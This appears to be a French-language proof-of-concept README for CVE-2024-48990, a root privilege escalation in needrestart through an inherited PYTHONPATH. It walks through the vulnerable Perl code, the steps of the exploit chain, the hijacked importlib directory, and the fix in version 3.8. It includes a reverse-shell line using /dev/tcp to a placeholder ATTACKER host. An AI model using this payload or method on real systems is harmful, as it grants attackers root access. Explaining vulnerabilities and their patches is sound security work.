# CVE-2024-48990-PoC

### 🔍 L'ORIGINE DE LA FAILLE

#### 1️⃣ **Le Code Vulnérable dans needrestart**

La faille se trouve dans le fichier `perl/lib/NeedRestart/Interp/Python.pm`. Voici ce que fait needrestart :

```perl
# needrestart lit les variables d'environnement du processus Python
my %env = nr_parse_env($pid);  # Lit /proc/<pid>/environ

# Si PYTHONPATH existe, needrestart l'utilise directement !
$ENV{PYTHONPATH} = $env{PYTHONPATH} if(defined($env{PYTHONPATH}));

# Puis needrestart lance Python avec cette PYTHONPATH
my ($pyread, $pywrite) = nr_fork_pipe2($self->{debug}, $ptable->{exec}, '-');
print $pywrite "import sys\nprint(sys.path)\n";  # ← CODE EXÉCUTÉ
```

#### 2️⃣ **Pourquoi c'est dangereux ?**

**needrestart fait CONFIANCE AVEUGLE** aux variables d'environnement de l'utilisateur :

1. **needrestart tourne en root** (lancé par `sudo apt install...`)
2. Il scanne TOUS les processus Python actifs
3. Il lit leur `PYTHONPATH` depuis `/proc/<pid>/environ`
4. **Il copie cette PYTHONPATH dans son propre environnement**
5. Il exécute du code Python **en tant que root** avec cette PYTHONPATH modifiée

### 💥 LA CHAÎNE D'EXPLOITATION

#### Étape par étape :

```
┌─────────────────────────────────────┐
│ 1. Attaquant (utilisateur normal)   │
│    export PYTHONPATH=/tmp/evil      │
│    python3 loop.py  # tourne en     │
│                     # boucle infinie│
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 2. Admin fait une mise à jour       │
│    sudo apt install curl            │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 3. apt lance needrestart (en ROOT)  │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 4. needrestart scanne les processus │
│    - Trouve le processus Python     │
│    - Lit /proc/<pid>/environ        │
│    - Trouve PYTHONPATH=/tmp/evil    │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 5. needrestart copie la PYTHONPATH  │
│    $ENV{PYTHONPATH} = "/tmp/evil"   │
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 6. needrestart exécute Python       │
│    avec la PYTHONPATH malveillante  │
│    "import sys" ← déclenche importlib│
└────────────┬────────────────────────┘
             │
             ▼
┌─────────────────────────────────────┐
│ 7. Python charge /tmp/evil/importlib│
│    __init__.py s'exécute EN ROOT!   │
│    → Reverse shell root obtenu! 🎉  │
└─────────────────────────────────────┘
```

### 🎯 L'ASTUCE CLÉE : importlib

**Pourquoi `importlib` ?**

```python
# needrestart exécute ce code :
import sys
print(sys.path)
```

* `sys` est un module **built-in** → on ne peut pas le hijacker
* **MAIS** l'instruction `import` elle-même utilise le module `importlib` !
* `importlib` est **chargé dynamiquement** → on peut le hijacker !

### 📂 Structure de l'exploit

```bash
/tmp/evil/
└── importlib/
    └── __init__.py   # ← S'exécute automatiquement au chargement !
```

Le fichier `__init__.py` contient :

```python
import os
# Ce code s'exécute EN ROOT quand needrestart fait "import sys"
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER/1337 0>&1'")
```

### 🔑 POURQUOI ÇA MARCHE ?

#### La faille réside dans ces 3 problèmes combinés :

1. **Confiance aveugle** : needrestart lit et utilise `PYTHONPATH` de l'utilisateur sans validation
2. **Élévation de contexte** : La `PYTHONPATH` de l'utilisateur devient la `PYTHONPATH` de root
3. **Exécution automatique** : Les fichiers `__init__.py` s'exécutent dès le chargement du module

### 🛡️ LE PATCH (version 3.8)

Le correctif est simple : **ne plus copier PYTHONPATH** !

```perl
# AVANT (vulnérable) :
$ENV{PYTHONPATH} = $env{PYTHONPATH} if(defined($env{PYTHONPATH}));

# APRÈS (corrigé) :
# Cette ligne est supprimée !
```

***

**En résumé** : La faille vient du fait que needrestart **fait confiance aux variables d'environnement des utilisateurs normaux et les utilise dans un contexte root**, permettant un détournement de bibliothèque Python.
